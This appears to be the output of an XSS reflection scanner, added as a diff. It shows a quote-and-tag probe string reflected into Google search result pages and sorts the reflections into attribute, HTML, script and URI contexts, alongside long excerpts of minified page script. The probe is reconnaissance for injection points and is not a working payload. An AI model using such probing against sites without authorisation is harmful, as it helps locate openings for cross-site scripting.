@@ -1,0 +1,276 @@
+https://www.usagold.com/cpmforum/help-accessibility/
+
+GET Params:[2]
+['sitesearch', 'q']
+_______________________________________________________________________________________________________
+https://www.google.com/search?sitesearch=(uvw"xyz'yxz</zxy&q=
+
+----------------------------------------------------------------------------------
+Attribute Context: [2]
+<input class="gLFyf gsfi" maxlength="2048" name="q" type="text" jsaction="paste:puy29d" aria-autocomplete="both" aria-haspopup="false" autocapitalize="off" autocomplete="off" autocorrect="off" role="combobox" spellcheck="false" title="Search" value="site:(uvw%22xyz%27yxz%3C/zxy" aria-label="Search" data-ved="0ahUKEwjrgN2_1eXoAhUqyzgGHbKYAqkQ39UDCAk">
+<div jsdata="GXYZuf;;ABWQtM" jscontroller="G3eKy" jsl="$t t-w-XilABeKRA;$x 0;" class="r-iDcy9PUGeliM">
+
+----------------------------------------------------------------------------------
+HTML Context: [3]
+<title>site:(uvw%22xyz%27yxz%3C/zxy - Google Search</title>
+<b>(uvw%22xyz%27yxz%3C/zxy</b>
+<em>site:(uvw%22xyz%27yxz%3C/zxy</em>
+
+----------------------------------------------------------------------------------
+Script Context: [1]
+<script nonce="A78qa26WxtzEnCXoL6gU+g==">(function(){google.ldi={};google.pim={};})();(function(){var u='/xjs/_/js/k\x3dxjs.s.en_GB.YlbWwcv8Rzo.O/ck\x3dxjs.s._psGpbc7COU.L.W.O/m\x3dFkg7bd,HcFEGb,IvlUe,MC8mtf,OF7gzc,RMhBfe,T4BAC,TJw5qb,TbaHGc,Y33vzc,ZyRBae,cdos,hsm,iDPoPb,jsa,mvYTse,tg8oTe,uz938c,vWNDde,ws9Tlc,yQ43ff,d,csi/am\x3dAAQAAMASgF13AJz_TQAAF8w4AAAggBvBxgIpIqEgAAGsuggCAQ/d\x3d1/dg\x3d2/ct\x3dzgms/rs\x3dACT90oGH5qsv6t9wsw0xPVUy40iHVnuuOQ';
+setTimeout(function(){var b=document;var a="SCRIPT";"application/xhtml+xml"===b.contentType&&(a=a.toLowerCase());a=b.createElement(a);a.src=u;google.timers&&google.timers.load&&google.tick&&google.tick("load","xjsls");document.body.appendChild(a)},0);})();(function(){window.google.xjsu='/xjs/_/js/k\x3dxjs.s.en_GB.YlbWwcv8Rzo.O/ck\x3dxjs.s._psGpbc7COU.L.W.O/m\x3dFkg7bd,HcFEGb,IvlUe,MC8mtf,OF7gzc,RMhBfe,T4BAC,TJw5qb,TbaHGc,Y33vzc,ZyRBae,cdos,hsm,iDPoPb,jsa,mvYTse,tg8oTe,uz938c,vWNDde,ws9Tlc,yQ43ff,d,csi/am\x3dAAQAAMASgF13AJz_TQAAF8w4AAAggBvBxgIpIqEgAAGsuggCAQ/d\x3d1/dg\x3d2/ct\x3dzgms/rs\x3dACT90oGH5qsv6t9wsw0xPVUy40iHVnuuOQ';})();function _DumpException(e){throw e;}
+function _F_installCss(c){}
+(function(){google.spjs=false;google.snet=true;google.em=[];google.emw=false;google.pdt=0;google.uwp=false;})();(function(){var pmc='{\x22Fkg7bd\x22:{},\x22HcFEGb\x22:{},\x22IvlUe\x22:{},\x22MC8mtf\x22:{},\x22OF7gzc\x22:{},\x22RMhBfe\x22:{},\x22T4BAC\x22:{},\x22TJw5qb\x22:{},\x22TbaHGc\x22:{},\x22Y33vzc\x22:{},\x22ZyRBae\x22:{},\x22aa\x22:{},\x22abd\x22:{\x22abd\x22:false,\x22deb\x22:false,\x22det\x22:false},\x22async\x22:{},\x22bgd\x22:{\x22ac\x22:true,\x22as\x22:true,\x22at\x22:0,\x22ea\x22:true,\x22ed\x22:0,\x22ei\x22:true,\x22el\x22:true,\x22ep\x22:true,\x22er\x22:true,\x22et\x22:0,\x22eu\x22:false,\x22wl\x22:false},\x22cdos\x22:{\x22cdobsel\x22:false},\x22csi\x22:{},\x22d\x22:{},\x22ddls\x22:{},\x22dvl\x22:{\x22cookie_secure\x22:true,\x22cookie_timeout\x22:86400,\x22driver_ui_type\x22:2,\x22jsc\x22:\x22[null,null,null,30000,null,null,null,2,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,[\\\x2286400000\\\x22,\\\x22604800000\\\x22,2.0]\\n,null,1]\\n\x22,\x22mnr_crd\x22:\x221\x22,\x22msg_dsc\x22:\x22From your Internet address\x22,\x22msg_dsc_url\x22:\x22\x22,\x22msg_dvl\x22:\x22From your device\x22,\x22msg_err\x22:\x22Location unavailable\x22,\x22msg_gps\x22:\x22Using GPS\x22,\x22msg_unk\x22:\x22Unknown\x22,\x22msg_upd\x22:\x22Update location\x22,\x22msg_use\x22:\x22Use precise location\x22,\x22uul_text\x22:\x22Lahore\x22},\x22foot\x22:{\x22pf\x22:true,\x22po\x22:true,\x22qe\x22:false},\x22gf\x22:{\x22pid\x22:196},\x22hsm\x22:{},\x22iDPoPb\x22:{},\x22jsa\x22:{\x22csi\x22:true,\x22csir\x22:100},\x22kyn\x22:{},\x22llc\x22:{},\x22lu\x22:{},\x22m\x22:{},\x22mUpTid\x22:{},\x22mpck\x22:{\x22me\x22:false},\x22mu\x22:{\x22murl\x22:\x22https://adservice.google.com/adsid/google/ui\x22},\x22mvYTse\x22:{},\x22sb_wiz\x22:{\x22rfs\x22:[],\x22stok\x22:\x22juOINEekaZa0FyrUb3oi-Tj6BWg\x22},\x22sf\x22:{},\x22sonic\x22:{},\x22spch\x22:{\x22ae\x22:\x22Please check your microphone.  \\u003Ca href\x3d\\\x22https://support.google.com/chrome/?p\x3dui_voice_search\\\x22 target\x3d\\\x22_blank\\\x22\\u003ELearn more\\u003C/a\\u003E\x22,\x22hl\x22:\x22en-PK\x22,\x22im\x22:\x22Click \\u003Cb\\u003EAllow\\u003C/b\\u003E to start voice search\x22,\x22iw\x22:\x22Waiting...\x22,\x22lm\x22:\x22Listening...\x22,\x22lu\x22:\x22%1$s voice search not available\x22,\x22mb\x22:false,\x22ne\x22:\x22No Internet connection\x22,\x22nt\x22:\x22Didn\x27t get that. \\u003Cspan\\u003ETry again\\u003C/span\\u003E\x22,\x22nv\x22:\x22Please check your microphone and audio levels.  \\u003Ca href\x3d\\\x22https://support.google.com/chrome/?p\x3dui_voice_search\\\x22 target\x3d\\\x22_blank\\\x22\\u003ELearn more\\u003C/a\\u003E\x22,\x22pe\x22:\x22Voice search has been turned off.  \\u003Ca href\x3d\\\x22https://support.google.com/chrome/?p\x3dui_voice_search\\\x22 target\x3d\\\x22_blank\\\x22\\u003EDetails\\u003C/a\\u003E\x22,\x22rm\x22:\x22Speak now\x22},\x22tg8oTe\x22:{},\x22tl\x22:{\x22rvkey\x22:\x22AIzaSyC_9Rt88UMjzgg5pIVArnfuIVkJx4zCdTY\x22},\x22uz938c\x22:{},\x22vWNDde\x22:{},\x22vs\x22:{},\x22ws9Tlc\x22:{},\x22yQ43ff\x22:{}}';google.pmc=JSON.parse(pmc);})();(function(){var r=['sb_wiz','aa','abd','async','bgd','dvl','foot','kyn','lu','m','mUpTid','mpck','mu','sf','sonic','spch','tl','vs','exdc'];google.plm(r);})();(function(){var m=[[["root",[["t-w-XilABeKRA","iDcy9PUGeliM","r-iDcy9PUGeliM",null,null,"exdc"]
+]
+,""]
+]
+]
+;google.jsc&&google.jsc.m(m);google.log('rfl','');})();(function(){var m=['ABWQtE','[\x22psy-ab\x22,\x22gws-wiz\x22,\x22site:(uvw%22xyz%27yxz%3C/zxy\x22,\x22\x22,null,1,0,0,11,\x22en\x22,\x22juOINEekaZa0FyrUb3oi-Tj6BWg\x22,\x22\x22,\x22jH6UXuuKDqqW4-EPsrGKyAo\x22,0,\x22en-PK\x22,null,null,null,0,null,null,3,5,null,null,0,-1,0,0,0,\x22\x22,0,0,\x22\x22,null,0,null,0,null,\x22/suggest\x22,0,0,0,0,0]\n','ABWQtI','[0,0,0,[null,null,[[[3,null,null,[null,[[\x22qdr_\x22,1,6]\n,[\x22qdr_h\x22,0,6]\n,[\x22qdr_d\x22,0,6]\n,[\x22qdr_w\x22,0,6]\n,[\x22qdr_m\x22,0,6]\n,[\x22qdr_y\x22,0,6]\n,[\x22cdr_opt\x22,0,1,[1,\x22Custom range...\x22,null,\x22cdr:1,cd_min:x,cd_max:x\x22,\x22\x22,\x22text\x22,\x22\x22,\x22\x22,6,1,[[[\x22q\x22,\x22site:(uvw%22xyz%27yxz%3C/zxy\x22]\n]\n]\n,\x22cdr_opt\x22,\x225/23/2004\x22,0]\n]\n]\n,0]\n]\n,[3,null,null,[null,[[\x22li_\x22,1,6]\n,[\x22li_1\x22,0,6]\n]\n,1]\n]\n]\n,null,[\x22tbs\x22]\n]\n]\n,null,null,[null,[[\x22/search?q\\u003dsite:(uvw%2522xyz%2527yxz%253C/zxy\\u0026source\\u003dlnms\x22,null,null,\x22All\x22,1,null,1,null,null,\x22WEB\x22,[0,2]\n,null,null,0]\n,[\x22/search?q\\u003dsite:(uvw%2522xyz%2527yxz%253C/zxy\\u0026source\\u003dlnms\\u0026tbm\\u003disch\x22,null,null,\x22Images\x22,0,null,1,null,null,\x22IMAGES\x22,[6,2]\n,null,null,6]\n,[\x22/search?q\\u003dsite:(uvw%2522xyz%2527yxz%253C/zxy\\u0026source\\u003dlnms\\u0026tbm\\u003dnws\x22,null,null,\x22News\x22,0,null,1,null,null,\x22NEWS\x22,[10,2]\n,null,null,10]\n]\n,[[\x22/search?q\\u003dsite:(uvw%2522xyz%2527yxz%253C/zxy\\u0026source\\u003dlnms\\u0026tbm\\u003dvid\x22,null,null,\x22Videos\x22,0,null,1,null,null,\x22VIDEOS\x22,[13,2]\n,null,null,13]\n,[\x22/search?q\\u003dsite:(uvw%2522xyz%2527yxz%253C/zxy\\u0026source\\u003dlnms\\u0026tbm\\u003dbks\x22,null,null,\x22Books\x22,0,null,1,null,null,\x22BOOKS\x22,[2,2]\n,null,null,2]\n,[\x22/search?q\\u003dsite:(uvw%2522xyz%2527yxz%253C/zxy\\u0026source\\u003dlnms\\u0026tbm\\u003dfin\x22,null,null,\x22Finance\x22,0,null,1,null,null,\x22FINANCE\x22,[22,2]\n,null,null,22]\n]\n]\n,null,1]\n','ABWQtM','[0,\x22inline\x22,2,2500,0,0]\n','ABWQtQ','[null,null,1,30000,null,null,null,2,null,null,3,null,null,null,null,null,1,null,null,null,null,null,null,[31.506432,74.3473152]\n,null,null,null,null,0,null,null,null,null,null,null,null,0,\x221586790028\x22,null,null,null,null,null,1,null,null,[\x2286400000\x22,\x22604800000\x22,2.0]\n,null,1]\n','ABWQtU','[\x22https://www.google.com.pk/domainless/read?igu\\u003d1\x22,\x22AFz9ztuHbNY00JFLxzkeV9nefEQ4CJAaqA:1586790028399\x22,3]\n','ABWQtY','[1,null,null,1261,1349,0]\n'];
+var a=m;window.W_jd=window.W_jd||{};for(var b=0;b<a.length;b+=2)window.W_jd[a[b]]=JSON.parse(a[b+1]);})();(function(){window.WIZ_global_data={"Yllh3e":"%.@.1586790028230763,104385322,2835519666]\n","zChJod":"%.@.]\n","pxO4Zd":"0","GWsdKe":"en-PK","SIsrTd":"false","LU5fGb":"false","w2btAe":"%.@.\"\",\"\",\"0\",null,null,null,1]\n","eptZe":"/_/WizRpcUi/","mXOY5d":"%.@.null,1]\n","fyLpDc":"","SsQ4x":"A78qa26WxtzEnCXoL6gU+g\u003d\u003d","xFbXr":"rgba(0,102,33,1)","lzJv9d":"#fff","y1HZEd":"false","QldWK":"6","in3Ilb":"#222","VQfWj":"#c0c0c0","lVRwic":"false","tpLZye":"#fff","PxA5sf":"rgba(0,0,0,.54)","osNyZ":"1.0","QDXUyc":"#188038","xz9C5b":"true","bXvyY":"#fff","p7BdKe":"true","Fcb4A":"#1A73E8","SfSmD":"#ebebeb","BwgO5":"16","zhBJde":"false","xT28q":"false","HjM8R":"#FFF","wFGKdc":"false","bmAEG":"#d9d9d9","Vdtb3d":"true","TKn0F":"20px","MiTaT":"#1A73E8","o9mzkf":"false","bVUXme":"25","EJG4vf":"pointer","xDKXr":"false","rsd6be":"1","Na6wt":"#e1e1e1","IfHuyb":"rgba(0,0,0,.54)","NvsKMd":"true","pxDH4c":"#0f9d58","JVBnre":"false","kL6Xwb":"false","wku5sd":"false","bmQ7Rb":"false","ZzVVh":"false","uRoR4d":"false","eXPt4e":"400","gjAni":"#3c4043","rWPbFe":"rgba(255,255,255,1)","nMRhJe":"false","TUhOL":"#fafafa","tuTJ6d":"#b8b8b8","iKzRxb":"#5f6368","h29koe":"32","sPiebd":"false","K2vQjf":"#f8f8f8","eo8dye":"#878787","Nk1Bhf":"#4285f4","AYXCHc":"false","H7aRye":"0px 5px 26px 0px rgba(0, 0, 0, 0.22), 0px 20px 28px 0px rgba(0, 0, 0, 0.30)","khoEPb":"#1a0dab","PIn0Ab":"1px solid #DFE1E5","o07h3e":"0 4px 5px rgba(0,0,0,.16)","voc95c":"false","Mlljec":"false","tyCgpc":"#fff","SezQgf":"500","aUt4Tc":"false","OjG6Qc":"#000","ToXxme":"#e5e5e5","X1bUEc":"arial,sans-serif-medium,sans-serif","z1x4kc":"true","YWHUvb":"18px","V6eh7c":"16","HWmJg":"#dcdcdc","AEMHld":"#eeeeee","oyB9kf":"rgba(0,0,0,.87)","MOPyub":"15","auaxA":"#222","VnH1Zb":"normal","wB1JTc":"false","j9ZYRc":"true","EiEfXb":"#ebebeb","mJempe":"13","L6WyEf":"true","W445Dc":"20","v44rSc":"#70757a","ENmP1c":"rgba(204,204,204,.15)","KTkDB":"false","haqSDf":"rgba(0,0,0,.54)","AwPxw":"false","BW8dtd":"rgba(248, 248, 248, 1)","FYBlgf":"false","By1ejd":"16","qmiCId":"true","BoqNoc":"20px","dTMnbc":"false","ppkaeb":"0","PngPbb":"rgba(0,0,0,.87)","o28sBd":"false","n1Whrf":"false","S1ZUDf":"true","ruHO7c":"#dd191d","i7mh3e":"16","Utapxe":"-webkit-","UnFEre":"16","k7G1xb":"15","eE52Jd":"#5f6368","Rnt1Qc":"false","oFa0q":"#fafafa","SidP2e":"rgba(248, 248, 248, 0)","kkVYtc":"false","dAFa0e":"false","fRkoq":"true","sBpVac":"rgba(0,0,0,.26)","prFQBe":"#ebebeb","srQSvc":"true","F4ULTd":"true","buGAI":"16","bDOvJc":"false","QnH6ad":"16","ZMFELd":"false","kVbEH":"false","u4NTBb":"40","KnXmRc":"10","FbN3Qc":"rgba(0,0,0,.87)","OQZvxe":"0 2px 10px 0 rgba(0,0,0,0.2)","WMBRj":"#009688","RpI44b":"#ebebeb","I69zkb":"rgba(204,204,204,.25)","JcUGee":"rgba(0,0,0,.54)","lLCPB":"true","V0Bluc":"none","PuOePe":"false","Vzh4p":"0px 7px 6px -5px #DFE1E5","X4yPd":"#1c3aa9","KFdH8":"true","xeVOLe":"#689f38","Ym5Ycb":"false","qj36Ef":"#323232","SATNMc":"1px solid #dfe1e5","hgWJ8c":"false","JRGsye":"none","N31mf":"false","iwHJId":"15","IvNqzc":"true","EuCkcd":"16","MoAfyf":"#fff","zHtpPb":"false","QA73ad":"false","ymIfqf":"18","zhkRO":"%.@.1,1,1,1,1,1,0,0,0,1]\n","z70S0c":"false","WnrBce":"rgba(0,0,0,.1)","NIYCKf":"28","pPtK5":"6","y519we":"true","ZLr84e":"true","owXwYb":"#f8f8f8","wlwuHd":"false","D8A8he":"true","qDYzS":"0 2px 10px 0 rgba(0,0,0,0.2)","umYEvb":"false","gir54":"0.4","LACYrf":"false","GzC2p":"#fff","LIYDac":"arial,sans-serif","EqX55c":"652","PPUcAe":"0px 0px 8px rgba(32, 33, 36, .24)","X4DPRd":"true","KD9WYe":"#1A73E8","eGDqv":"false","UNVSy":"false","SuQiSc":"1.3","b1KZw":"#fff","imHXAf":"true","AYVQWe":"20px","JyBo2c":"false","KVmtZc":"rgba(255,255,255,.3)","XgWQKd":"true","AP8pqf":"rgba(0,0,0,.12)","B8Dib":"rgba(0,0,0,.87)","iniaFd":"true","BYw9f":"false","Sgnmlc":"14px","VbmVYd":"true","B0husb":"true","EgTnfe":"true","VXIo7d":"8px","aKuscd":"#AECBFA","cdRSXc":"false","Tae7A":"true","Dc0uuf":"16","rx1dvd":"#f3f3f3","xBx7Dc":"36","fQC6Cf":"2px","vIMrp":"true","FiZWae":"32","T1V3fc":"#f4b400","tJ4Jdf":"11","s6Rzec":"0 16px","tqXjO":"false","KdGe5c":"false","yFVHo":"true","pch72b":"false","LnZAkd":"false","WxHUzd":"true","Hzi6pf":"#DFE1E5","e2p8ee":"false","ue6nDb":"Roboto-Medium,Roboto-Regular","j0DpSe":"false","iDTSkb":"true","PYrjqe":"40","QSF9Ec":"","S7nbec":"16","y2Hs7d":"false","a7rhWc":"false","kvKIW":"false","xvI8we":"#212121","ConpTc":"false","a8Umdd":"rgba(153,153,153,.4)","jIrJIf":"14","JpB3Ue":"60","kePaAc":"-4","WyvaRd":"0 1px 1px rgba(0,0,0,.16)","A5tF3b":"false","FF58Bf":"true","KgXmrd":"true","AQEr7b":"#c6c6c6","GTYTQ":"#ffeb3b","rRLesf":"0","klgere":"invert(1) hue-rotate(180deg)","hbfefd":"#1A73E8","vhCwfc":"false","pLhKvc":"0","ib0wve":"rgba(153,153,153,.2)","BdVmgf":"16","fjc61":"false","aD6AQe":"#757575","YXGVrd":"true","R9GQh":"#fff","iryGqc":"2","ZxI7Af":"#fafafa","ekXXzb":"13px","U6xP0":"#4285f4","FydCC":"true","qkXvHd":"500","RJegIe":"#fffff0","OqjdAf":"true","abZ6pc":"#f9a825","ODgkgd":"#fff","g635Ab":"2px","rX9Pnb":"16","WWz0vd":"false","A2aVpb":"50","seVajd":"rgba(0,0,0,.12)","gqXETb":"#db4437","hWyTvf":"false","jg5SCd":"false","gbf9Eb":"58","tqmosb":"#fff","q7vEEb":"false","pDiOce":"false","UduJSb":"%.@.\"0 0\",0,0,20,20,\"/images/searchbox/desktop_searchbox_sprites302_hr.png\",\"20px\"]\n","NW4nA":"rgba(255,255,255,.7)","SpZHZd":"true","hqg9c":"#1878f0","rZYUef":"#f5f5f5","RZ03Ve":"#5677fc","fFepd":"-15"};window.IJ_values=["#fff","rgba(0,102,33,1)","rgba(0,0,0,.87)","rgba(0,0,0,.54)","rgba(255,255,255,1)","rgba(255,255,255,.7)",false,"%.@.\"\",\"\",\"0\",null,null,null,1]\n","0","%.@.null,1]\n","%.@.]\n","A78qa26WxtzEnCXoL6gU+g\u003d\u003d","%.@.\"0 0\",0,0,20,20,\"/images/searchbox/desktop_searchbox_sprites302_hr.png\",\"20px\"]\n","en-PK",false,"","%.@.1586790028230763,104385322,2835519666]\n",false,"/_/WizRpcUi/"];})();google.x(null, function(){(function(){(function(){google.csct={};google.csct.ps='AOvVaw3QifSiE7WDdAAoG4jL1UqF\x26ust\x3d1586876428270857';})();})();(function(){(function(){google.csct.pi=true;})();})();(function(){(function(){
+function f(){for(var c="&cshid="+google.cshid,d=document.querySelectorAll('[href^="/"]'),e=0,b;b=d[e++];){var a=b.getAttribute("href");a.match(/[\?|&](ei|ved)=/)&&-1==a.indexOf("cshid=")&&(-1==a.search("#")?b.setAttribute("href",a+c):(a=a.split("#"),b.setAttribute("href",a[0]+c+"#"+a[1])))}d=document.querySelectorAll("[ping]");for(e=0;b=d[e++];)a=b.getAttribute("ping"),-1==a.indexOf("cshid=")&&b.setAttribute("ping",a+c)};google.csh=google.csh||{};google.csh.ict=function(c){google.cshid&&(c&&window.MutationObserver?google.dclc(function(){(new MutationObserver(f)).observe(document.querySelector("body"),{attributes:!0,childList:!0,subtree:!0,characterData:!0})}):google.dclc(f))};}).call(this);})();(function(){(function(){var umo=false;google.csh.ict(umo);})();})();(function(){window.jsl=window.jsl||{};window.jsl.dh=window.jsl.dh||function(i,c,d){try{var e=document.getElementById(i);if(e){e.innerHTML=c;if(d){d();}}else{if(window.jsl.el){window.jsl.el(new Error('Missing ID.'),{'id':i});}}}catch(e){if(window.jsl.el){window.jsl.el(new Error('jsl.dh'));}}};})();(function(){window.jsl.dh('hdtbMenus','\x3cdiv class\x3d\x22hdtb-mn-cont\x22\x3e\x3cdiv id\x3d\x22XJDHvf\x22\x3e\x3c/div\x3e\x3cdiv class\x3d\x22hdtb-mn-hd\x22 aria-haspopup\x3d\x22true\x22 role\x3d\x22button\x22 tabindex\x3d\x220\x22\x3e\x3cdiv class\x3d\x22mn-hd-txt\x22\x3eAny time\x3c/div\x3e\x3cspan class\x3d\x22mn-dwn-arw\x22\x3e\x3c/span\x3e\x3c/div\x3e\x3cul class\x3d\x22hdtbU hdtb-mn-c\x22\x3e\x3cli class\x3d\x22hdtbItm hdtbSel\x22 id\x3d\x22qdr_\x22 tabindex\x3d\x220\x22\x3eAny time\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_h\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3dsite:(uvw%2522xyz%2527yxz%253C/zxy\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:h\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjrgN2_1eXoAhUqyzgGHbKYAqkQpwV6BAgBEBY\x22\x3ePast hour\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_d\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3dsite:(uvw%2522xyz%2527yxz%253C/zxy\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:d\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjrgN2_1eXoAhUqyzgGHbKYAqkQpwV6BAgBEBc\x22\x3ePast 24 hours\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_w\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3dsite:(uvw%2522xyz%2527yxz%253C/zxy\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:w\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjrgN2_1eXoAhUqyzgGHbKYAqkQpwV6BAgBEBg\x22\x3ePast week\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_m\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3dsite:(uvw%2522xyz%2527yxz%253C/zxy\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:m\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjrgN2_1eXoAhUqyzgGHbKYAqkQpwV6BAgBEBk\x22\x3ePast month\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22qdr_y\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3dsite:(uvw%2522xyz%2527yxz%253C/zxy\x26amp;source\x3dlnt\x26amp;tbs\x3dqdr:y\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjrgN2_1eXoAhUqyzgGHbKYAqkQpwV6BAgBEBo\x22\x3ePast year\x3c/a\x3e\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22vjyzWd\x22\x3e\x3cdiv jscontroller\x3d\x22Uuupec\x22 data-m\x3d\x22true\x22\x3e\x3cspan class\x3d\x22q\x22 id\x3d\x22cdrlnk\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22EEGHee\x22 data-ved\x3d\x222ahUKEwjrgN2_1eXoAhUqyzgGHbKYAqkQpwV6BAgBEBs\x22\x3eCustom range...\x3c/span\x3e\x3cdiv class\x3d\x22n5Ug4b\x22 style\x3d\x22display:none\x22\x3e\x3cdiv class\x3d\x22vOvh1b\x22 jsaction\x3d\x22xp3IKd\x22\x3e\x3c/div\x3e\x3cdiv class\x3d\x22J6UZg\x22\x3e\x3cdiv class\x3d\x22Jy9Ore\x22\x3eCustomised date range\x3c/div\x3e\x3clabel class\x3d\x22Qtsmnf tmDYm\x22 for\x3d\x22OouJcb\x22\x3eFrom\x3c/label\x3e\x3clabel class\x3d\x22Qtsmnf iWBKNe\x22 for\x3d\x22rzG2be\x22\x3eTo\x3c/label\x3e\x3cdiv class\x3d\x22Gwgzqd\x22 role\x3d\x22button\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22xp3IKd\x22\x3e\x3c/div\x3e\x3cdiv class\x3d\x22NwEGxd\x22\x3e\x3cdiv class\x3d\x22qomYCd\x22\x3e\x3c/div\x3e\x3cform action\x3d\x22/search\x22 class\x3d\x22T3kYXe\x22 method\x3d\x22get\x22\x3e\x3cinput name\x3d\x22q\x22 value\x3d\x22site:(uvw%22xyz%27yxz%3C/zxy\x22 type\x3d\x22hidden\x22\x3e\x3cinput name\x3d\x22source\x22 type\x3d\x22hidden\x22 value\x3d\x22lnt\x22\x3e\x3cinput value\x3d\x22cdr:1,cd_min:x,cd_max:x\x22 id\x3d\x22HjtPBb\x22 name\x3d\x22tbs\x22 type\x3d\x22hidden\x22\x3e\x3cinput value\x3d\x22\x22 name\x3d\x22tbm\x22 type\x3d\x22hidden\x22\x3e\x3cinput class\x3d\x22OouJcb ktf mini\x22 type\x3d\x22text\x22 value\x3d\x22\x22 autocomplete\x3d\x22off\x22 id\x3d\x22OouJcb\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22focus:daRB0b\x22\x3e\x3cinput class\x3d\x22rzG2be ktf mini\x22 type\x3d\x22text\x22 value\x3d\x22\x22 autocomplete\x3d\x22off\x22 id\x3d\x22rzG2be\x22 tabindex\x3d\x220\x22 jsaction\x3d\x22focus:daRB0b\x22\x3e\x3cinput class\x3d\x22Ru1Ao ksb mini\x22 value\x3d\x22Go\x22 tabindex\x3d\x220\x22 type\x3d\x22submit\x22 jsaction\x3d\x22tnv.scf\x22\x3e\x3c/form\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e\x3c/div\x3e\x3c/li\x3e\x3c/ul\x3e\x3cspan class\x3d\x22hQKUmb\x22\x3e\x3c/span\x3e\x3cdiv class\x3d\x22hdtb-mn-hd\x22 aria-haspopup\x3d\x22true\x22 role\x3d\x22button\x22 tabindex\x3d\x220\x22\x3e\x3cdiv class\x3d\x22mn-hd-txt\x22\x3eAll results\x3c/div\x3e\x3cspan class\x3d\x22mn-dwn-arw\x22\x3e\x3c/span\x3e\x3c/div\x3e\x3cul class\x3d\x22hdtbU hdtb-mn-c\x22\x3e\x3cli class\x3d\x22hdtbItm hdtbSel\x22 id\x3d\x22li_\x22 tabindex\x3d\x220\x22\x3eAll results\x3c/li\x3e\x3cli class\x3d\x22hdtbItm\x22 id\x3d\x22li_1\x22\x3e\x3ca class\x3d\x22q qs\x22 href\x3d\x22/search?q\x3dsite:(uvw%2522xyz%2527yxz%253C/zxy\x26amp;source\x3dlnt\x26amp;tbs\x3dli:1\x26amp;sa\x3dX\x26amp;ved\x3d2ahUKEwjrgN2_1eXoAhUqyzgGHbKYAqkQpwV6BAgBEB4\x22\x3eVerbatim\x3c/a\x3e\x3c/li\x3e\x3c/ul\x3e\x3cspan class\x3d\x22hQKUmb\x22\x3e\x3c/span\x3e\x3c/div\x3e');})();(function(){google.drty&&google.drty();})();});</script>
+
+----------------------------------------------------------------------------------
+URI Context: [12]
+<a href="/search?q=site:(uvw%2522xyz%2527yxz%253C/zxy&amp;gbv=1&amp;sei=jH6UXuuKDqqW4-EPsrGKyAo">
+<a class="gb_4 gb_5 gb_he gb_1c" href="https://accounts.google.com/ServiceLogin?hl=en&amp;passive=true&amp;continue=https://www.google.com/search%3Fsitesearch%3D(uvw%2522xyz%27yxz%253C/zxy%26q%3D" target="_top">
+<a class="q qs" href="/search?q=site:(uvw%2522xyz%2527yxz%253C/zxy&amp;source=lnms&amp;tbm=isch&amp;sa=X&amp;ved=2ahUKEwjrgN2_1eXoAhUqyzgGHbKYAqkQ_AUoAXoECAEQAw">
+<a class="q qs" href="/search?q=site:(uvw%2522xyz%2527yxz%253C/zxy&amp;source=lnms&amp;tbm=nws&amp;sa=X&amp;ved=2ahUKEwjrgN2_1eXoAhUqyzgGHbKYAqkQ_AUoAnoECAEQBA">
+<a class="f9UGee q qs" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" href="/search?q=site:(uvw%2522xyz%2527yxz%253C/zxy&amp;source=lnms&amp;tbm=vid&amp;sa=X&amp;ved=2ahUKEwjrgN2_1eXoAhUqyzgGHbKYAqkQ_AUoAHoECAEQBg">
+<a class="f9UGee q qs" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" href="/search?q=site:(uvw%2522xyz%2527yxz%253C/zxy&amp;source=lnms&amp;tbm=bks&amp;sa=X&amp;ved=2ahUKEwjrgN2_1eXoAhUqyzgGHbKYAqkQ_AUoAXoECAEQBw">
+<a class="f9UGee q qs" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" href="/search?q=site:(uvw%2522xyz%2527yxz%253C/zxy&amp;source=lnms&amp;tbm=fin&amp;sa=X&amp;ved=2ahUKEwjrgN2_1eXoAhUqyzgGHbKYAqkQ_AUoAnoECAEQCA">
+<a href="/preferences?hl=en&amp;prev=https://www.google.com/search?sitesearch%3D(uvw%252522xyz%252527yxz%25253C/zxy%26q%3D" class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-ved="2ahUKEwjrgN2_1eXoAhUqyzgGHbKYAqkQo_oBegQIARAK">
+<a href="/preferences?hl=en&amp;prev=https://www.google.com/search?sitesearch%3D(uvw%252522xyz%252527yxz%25253C/zxy%26q%3D#languages" class="f9UGee" jsaction="mouseover:sbHm2b" role="menuitem" tabindex="-1" data-ved="2ahUKEwjrgN2_1eXoAhUqyzgGHbKYAqkQo_oBegQIARAL">
